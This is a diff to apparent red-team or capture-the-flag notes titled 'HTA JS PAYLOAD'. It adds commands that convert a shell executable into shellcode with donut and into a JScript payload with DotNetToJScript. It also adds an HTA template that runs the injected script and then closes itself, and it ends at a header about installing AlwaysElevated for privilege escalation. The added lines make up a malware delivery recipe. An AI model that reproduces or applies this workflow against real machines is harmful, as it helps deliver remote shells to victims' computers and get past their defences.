@@ -7,7 +7,31 @@ HTA JS PAYLOAD
 ---------------------
 DotNetToJScript
 ```powershell
-DotNetToJScript.exe ExampleAssembly.dll --lang=JScript --ver=4 -o payload.js
+C:\Users\ctf\Downloads\donut_v1.1\donut.exe -a 2 -f 1 -o ipv4.bin -i ipv4shell.exe
+```
+Change in TestClass.cs file url
+
+Build ExampleAssemly.dll
+
+
+Generate the js file
+```
+C:\Users\ctf\Downloads\release_v1.0.4\DotNetToJscript.exe ExampleAssembly.dll --lang=JScript --ver=4 -o payload.js
+```
+
+```hta
+<html>
+<head>
+<script language="JScript">
+// ADD JS HERE
+</script>
+</head>
+<body>
+<script language="JScript">
+self.close();
+</script>
+</body>
+</html>
 ```
 Install AlwaysElevated
 -----------------------
